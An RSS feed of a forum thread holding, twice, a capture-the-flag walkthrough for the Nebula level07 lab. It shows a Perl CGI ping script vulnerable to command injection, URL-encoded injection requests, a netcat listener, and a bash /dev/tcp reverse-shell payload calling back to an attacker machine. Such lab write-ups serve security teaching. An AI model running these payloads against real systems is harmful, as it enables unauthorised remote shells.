@@ -1,0 +1,196 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>How to pwned Nebula : level07 - Command Injection CGI script</title>
+    <link>https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710</link>
+    <description># Exploit-Exercice : Nebula
+---
+
+## Level07 - Command injection
+
+Here what we can find on exploit-exercice 
+&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
+To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
+
+They also provide the source code 
+```perl
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print &quot;Content-type: text/html\n\n&quot;;
+
+sub ping {
+  $host = $_[0];
+
+  print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);
+
+  @output = `ping -c 3 $host 2&gt;&amp;1`;
+  foreach $line (@output) { print &quot;$line&quot;; }
+
+  print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param(&quot;Host&quot;));
+```
+
+The weakness of this program is this line 
+
+```perl
+@output = `ping -c 3 $host 2&gt;&amp;1`;
+```
+
+if we control the variable host we can inject command and get a shell 
+
+so let&#39;s try to take &quot;hack&quot; this program 
+
+We can run the index.cgi with perl like this 
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/afd81817fd5b3af215fa65d5f37be8af62a13495.png&quot; width=&quot;690&quot; height=&quot;207&quot;&gt;
+
+the **Host=localhost** set the parameter to localhost
+
+Let&#39;s try to inject a command 
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/50a12bf131dc050d4c6da4346c95838a901f4b65.png&quot; width=&quot;690&quot; height=&quot;337&quot;&gt;
+
+You can see that this script is run as level07. This is not what we want, let&#39;s read the thttpd.conf
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/161764a378234f7b5e1048fe68409e24ab60d2b5.png&quot; width=&quot;690&quot; height=&quot;352&quot;&gt;
+
+This is interesting a server run on port 7007 
+
+Now I will show you a  method to get a reverse shell
+
+# Web Browser attack 
+Open kali linux and go to http://nebula_ip:7007/index.cgi?Host=localhost
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/f650a5cad375ae49f32284bbb0bd330449cf5edc.png&quot; width=&quot;690&quot; height=&quot;244&quot;&gt;
+
+You will see the result of the ping in your web browser 
+Well if we run our command like this http://nebula_ip:7007/index.cgi?Host=localhost; id ? will it work ? 
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/a7ae1b2b5d0863ddcbe771e0bff5066071af3bd7.png&quot; width=&quot;690&quot; height=&quot;244&quot;&gt;
+
+What ? no output of id command ? 
+
+So let&#39;s try to encode the &quot;;&quot; 
+http://nebula_ip:7007/index.cgi?Host=localhost%3Bid
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/ffa6d23ee3359efeaa4df4b71252efa4eb4e88b2.png&quot; width=&quot;505&quot; height=&quot;151&quot;&gt;
+
+Yes ! the command are executed as flag07 ! But now I want a shell ! 
+
+On my kali linux machine I run 
+```bash
+nc -lvp 8888
+```
+
+To have a reverse shell you can run 
+```bash
+bash -i &gt;&amp; /dev/tcp/kali_linux_ip/8888 0&gt;&amp;1
+```
+encode it and you will have 
+http://nebula_ip:7007/index.cgi?Host=localhost%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fkali_linux_ip%2F8888%200%3E%261
+
+if we visit the link and wait 
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/50853d2a8458ad264524496b00c2964a507b2e54.png&quot; width=&quot;594&quot; height=&quot;229&quot;&gt;
+
+You get a shell ! :) Well done Hacker ! You&#39;ll be ready for level08</description>
+    
+    <lastBuildDate>Sat, 09 Jul 2016 11:57:30 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>How to pwned Nebula : level07 - Command Injection CGI script</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710/2</link>
+        <pubDate>Sun, 21 Jan 2018 00:42:56 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-710-2</guid>
+        <source url="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710.rss">How to pwned Nebula : level07 - Command Injection CGI script</source>
+      </item>
+      <item>
+        <title>How to pwned Nebula : level07 - Command Injection CGI script</title>
+        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
+        <description><![CDATA[
+            <h1><a name="p-3463-exploit-exercice-nebula-1" class="anchor" href="https://d.clarkee.co.uk#p-3463-exploit-exercice-nebula-1"></a>Exploit-Exercice : Nebula</h1>
+<hr>
+<h2><a name="p-3463-level07-command-injection-2" class="anchor" href="https://d.clarkee.co.uk#p-3463-level07-command-injection-2"></a>Level07 - Command injection</h2>
+<p>Here what we can find on exploit-exercice</p>
+<blockquote>
+<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.<br>
+To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>
+</blockquote>
+<p>They also provide the source code</p>
+<pre data-code-wrap="perl"><code class="lang-perl">#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ping {
+  $host = $_[0];
+
+  print("&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;");
+
+  @output = `ping -c 3 $host 2&gt;&amp;1`;
+  foreach $line (@output) { print "$line"; }
+
+  print("&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;");
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param("Host"));
+</code></pre>
+<p>The weakness of this program is this line</p>
+<pre data-code-wrap="perl"><code class="lang-perl">@output = `ping -c 3 $host 2&gt;&amp;1`;
+</code></pre>
+<p>if we control the variable host we can inject command and get a shell</p>
+<p>so let’s try to take “hack” this program</p>
+<p>We can run the index.cgi with perl like this</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/afd81817fd5b3af215fa65d5f37be8af62a13495.png" data-download-href="/uploads/short-url/p5AxhBhJYAawiNheiGa1gp56ALz.png?dl=1" title="Pasted image" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/1X/afd81817fd5b3af215fa65d5f37be8af62a13495.png" width="690" height="207"></a></div><p></p>
+<p>the <strong>Host=localhost</strong> set the parameter to localhost</p>
+<p>Let’s try to inject a command</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/50a12bf131dc050d4c6da4346c95838a901f4b65.png" data-download-href="/uploads/short-url/bvhvodPRHJjmmBjwww63eA0YCK9.png?dl=1" title="Pasted image" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/1X/50a12bf131dc050d4c6da4346c95838a901f4b65.png" width="690" height="337"></a></div><p></p>
+<p>You can see that this script is run as level07. This is not what we want, let’s read the thttpd.conf</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/161764a378234f7b5e1048fe68409e24ab60d2b5.png" data-download-href="/uploads/short-url/39qCGbl2QvavPc7vQvbBMOSJSYt.png?dl=1" title="Pasted image" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/1X/161764a378234f7b5e1048fe68409e24ab60d2b5.png" width="690" height="352"></a></div><p></p>
+<p>This is interesting a server run on port 7007</p>
+<p>Now I will show you a  method to get a reverse shell</p>
+<h1><a name="p-3463-web-browser-attack-3" class="anchor" href="https://d.clarkee.co.uk#p-3463-web-browser-attack-3"></a>Web Browser attack</h1>
+<p>Open kali linux and go to http://nebula_ip:7007/index.cgi?Host=localhost<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/f650a5cad375ae49f32284bbb0bd330449cf5edc.png" data-download-href="/uploads/short-url/z90f9KELzyHrI0k46RgOCtuZfw8.png?dl=1" title="Pasted image" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/1X/f650a5cad375ae49f32284bbb0bd330449cf5edc.png" width="690" height="244"></a></div><p></p>
+<p>You will see the result of the ping in your web browser<br>
+Well if we run our command like this http://nebula_ip:7007/index.cgi?Host=localhost; id ? will it work ?<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/a7ae1b2b5d0863ddcbe771e0bff5066071af3bd7.png" data-download-href="/uploads/short-url/nVmL0DdvFGNml2Xmsjohu0Vr6kL.png?dl=1" title="Pasted image" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/1X/a7ae1b2b5d0863ddcbe771e0bff5066071af3bd7.png" width="690" height="244"></a></div><p></p>
+<p>What ? no output of id command ?</p>
+<p>So let’s try to encode the “;”<br>
+http://nebula_ip:7007/index.cgi?Host=localhost%3Bid<br>
+<img src="//0x00sec.s3.amazonaws.com/original/1X/ffa6d23ee3359efeaa4df4b71252efa4eb4e88b2.png" width="505" height="151"></p>
+<p>Yes ! the command are executed as flag07 ! But now I want a shell !</p>
+<p>On my kali linux machine I run</p>
+<pre data-code-wrap="bash"><code class="lang-bash">nc -lvp 8888
+</code></pre>
+<p>To have a reverse shell you can run</p>
+<pre data-code-wrap="bash"><code class="lang-bash">bash -i &gt;&amp; /dev/tcp/kali_linux_ip/8888 0&gt;&amp;1
+</code></pre>
+<p>encode it and you will have<br>
+http://nebula_ip:7007/index.cgi?Host=localhost%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fkali_linux_ip%2F8888%200%3E%261</p>
+<p>if we visit the link and wait</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/1X/50853d2a8458ad264524496b00c2964a507b2e54.png" width="594" height="229"></p>
+<p>You get a shell ! <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> Well done Hacker ! You’ll be ready for level08</p>
+          <p><a href="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710/1</link>
+        <pubDate>Fri, 08 Jul 2016 11:27:47 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-710-1</guid>
+        <source url="https://d.clarkee.co.uk/t/how-to-pwned-nebula-level07-command-injection-cgi-script/710.rss">How to pwned Nebula : level07 - Command Injection CGI script</source>
+      </item>
+  </channel>
+</rss>
